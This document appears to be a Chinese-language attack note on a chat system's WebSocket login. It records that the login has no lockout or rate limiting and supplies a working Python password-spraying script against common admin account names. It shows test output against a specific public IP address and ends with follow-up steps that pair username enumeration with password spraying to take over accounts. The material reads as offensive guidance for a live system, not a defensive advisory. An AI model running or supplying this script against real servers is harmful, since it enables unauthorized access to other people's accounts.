# 夜好推客服系统 /ws/chat —— WS login 无失败锁定 / 无速率限制

目标形态: http://<IP>:9800/chat  →  WS: ws://<IP>:9800/ws/chat
无需认证，一次 WS upgrade 握手即可反复尝试登录。

## 结论

- 错误口令只回同一句 {"action":"login","message":"用户名或密码错误","success":false,"type":"auth"}
- 单一账号连续 5 次失败：不锁定、不累加
- 跨 10 个账号累计 50 次失败：无 429 / 无连接重置 / 无临时封禁 / 无验证码 / 无「还剩 N 次」提示
- 第 50 次仍返回同一错误 → 失败计数未落地，可对已知账号无约束地持续喷洒口令

## 关键约束

每次 login/register 都必须使用**全新 WS 连接**：登录成功后的连接进入会话态，会阻断同连接上后续的 auth 消息。

## 复现脚本（brute 模式，i27/kprobe.py）

```python
#!/usr/bin/env python3
# 夜好推 WS 凭据面验证：用户名枚举 + 管理类账号弱口令严格限幅
# 每次 login/register 用全新 WS 连接（登录后会话态会阻断同连接后续 auth）
import json, sys, time, os
sys.path.insert(0, "<ws.py 所在目录>")
from ws import connect, do_handshake, send_frame, recv_frame

def drain(s, sec):
    end = time.time()+sec; msgs=[]
    while time.time() < end:
        try: f = recv_frame(s, timeout=max(0.3, end-time.time()))
        except Exception: break
        if f is None: break
        op, data = f
        if op == 9: send_frame(s, data, opcode=10); continue
        if op == 8: break
        if op in (1,2): msgs.append(data.decode(errors="replace"))
    return msgs

def one(msg, sec=4):
    s = connect(); do_handshake(s); time.sleep(0.3); drain(s,1.0)
    send_frame(s, json.dumps({"type":"connect"})); drain(s,1.2)
    send_frame(s, json.dumps(msg))
    got = drain(s, sec)
    s.close()
    out=""
    for g in got:
        try:
            j=json.loads(g)
            if j.get("type")=="auth": return j
        except Exception:
            pass
        out=g
    return {"raw": out}

def login(u,p): return one({"type":"login","username":u,"password":p})
def reg(u,p,n="x"): return one({"type":"register","username":u,"password":p,"nickname":n})

if __name__=="__main__":
    mode = sys.argv[1]
    if mode=="brute":
        # 每账号 <=5 口令，独立连接，失败间 sleep
        accounts = ["admin","administrator","manager","kefu","客服","operator","root","boss","agent","system"]
        pws = ["123456","admin","admin123","12345678","password"]
        for a in accounts:
            for i,p in enumerate(pws):
                try:
                    r = login(a,p)
                except Exception as e:
                    print("[ERR]",a,p,e); break
                ok = r.get("success")
                print("[%s] %s/%s -> %s" % ("HIT" if ok else "no", a, p, json.dumps(r,ensure_ascii=False)[:220]))
                if ok:
                    print("*** HIT token:", r.get("token"))
                    break
                time.sleep(1.5)
```

（ws.py 为最小 RFC6455 客户端，无外部依赖、支持 HTTP 代理 CONNECT；完整实现见 kb#507 的 poc。）

## 实测回显（2026-11-11, 82.156.110.36:9800，共 50 次失败）

```
[no] admin/123456         -> {"action": "login", "message": "用户名或密码错误", "success": false, "type": "auth"}
[no] admin/admin          -> {"action": "login", "message": "用户名或密码错误", "success": false, "type": "auth"}
...
[no] system/12345678      -> {"action": "login", "message": "用户名或密码错误", "success": false, "type": "auth"}
[no] system/password      -> {"action": "login", "message": "用户名或密码错误", "success": false, "type": "auth"}
```

50 行全部为 [no] + 同一句「用户名或密码错误」，无一条出现锁定/封禁/验证码/剩余尝试次数提示。

## 后续用法

先用 register 用户名枚举 oracle（kb#507）把 admin / administrator / manager / kefu / 客服 / operator / root / boss / agent / system 等常见管理类名过一遍，拿到真实存在的账号清单后，
对这些账号做「严格限幅」的口令验证（每账号 <=5 口令、独立连接、间隔 >=1.5s）。
本条目证明的是：即便放开限幅，目标也不会锁定/节流——即口令喷洒的成本只由你自己的字典与并发决定。
